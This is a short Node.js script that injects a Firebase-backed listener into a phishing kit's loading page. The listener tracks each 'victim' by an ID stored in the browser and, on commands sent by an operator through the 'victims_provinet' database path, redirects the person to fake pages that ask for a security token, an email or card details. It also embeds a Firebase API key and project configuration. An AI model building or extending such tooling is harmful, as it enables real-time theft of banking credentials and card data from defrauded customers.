const fs = require('fs');
let html = fs.readFileSync('cargando.html', 'utf8');

const firebaseScript = `
<script src="https://www.gstatic.com/firebasejs/12.19.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/12.19.0/firebase-database-compat.js"></script>
<script>
  const firebaseConfig = {
    apiKey: "AIzaSyA9qspuy_l1vseHqKx9klUg3P9JGx_GZLo",
    authDomain: "sca-mms.firebaseapp.com",
    databaseURL: "https://sca-mms-default-rtdb.firebaseio.com",
    projectId: "sca-mms",
    storageBucket: "sca-mms.firebasestorage.app",
    messagingSenderId: "965549232304",
    appId: "1:965549232304:web:46186cadacaa0d3f5d73df"
  };
  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = firebase.database();
  const DB_PATH = 'victims_provinet';
  
  window.addEventListener('load', function() {
      let victimId = localStorage.getItem('current_victim_id');
      if (!victimId) return; // If no victim ID, do nothing

      db.ref(DB_PATH + '/' + victimId + '/command').on('value', function(snapshot) {
          const command = snapshot.val();
          if (command && command.action) {
              // Delete command so we don't immediately trigger it again
              db.ref(DB_PATH + '/' + victimId + '/command').remove().then(() => {
                  if (command.action === 'pedir_token') {
                      window.location.href = 'clave-especial.html';
                  } else if (command.action === 'pedir_correo') {
                      window.location.href = 'token-digital.html';
                  } else if (command.action === 'pedir_tarjeta') {
                      window.location.href = 'tarjeta.html';
                  } else if (command.action === 'pedir_tarjeta') {
                      window.location.href = 'tarjeta.html';
                  } else if (command.action === 'error_login' || command.action === 'error_usuario' || command.action === 'error_tarjeta' || command.action === 'error_tarjeta') {
                      window.location.href = 'error.html';
                  } else if (command.action === 'inicio') {
                      window.location.href = 'inicio.html';
                  }
              });
          }
      });
  });
</script>
</body>
`;

// Insert before closing body or just at the end if no body
if (html.includes('</body>')) {
    html = html.replace('</body>', firebaseScript);
} else {
    html += firebaseScript;
}

fs.writeFileSync('cargando.html', html, 'utf8');
console.log('Injected Firebase listener into cargando.html');
